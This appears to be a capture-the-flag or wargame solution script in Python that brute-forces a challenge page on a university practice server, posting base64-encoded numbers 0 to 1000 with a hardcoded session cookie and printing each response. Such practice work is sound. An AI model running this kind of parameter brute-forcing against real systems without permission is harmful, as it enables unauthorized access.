import requests
from base64 import b64encode

for i in range(1001):
    req = requests.post('http://wargame_sec.kongju.ac.kr/web/find/prob.php', data={'HaHa': b64encode(str(i).encode())}, cookies={'PHPSESSID': 'nnquamjj4f6s6c08s4sj3shun7'})

    if i != 1000:
      print(req.text[0:150])
    else:
      print(req.text)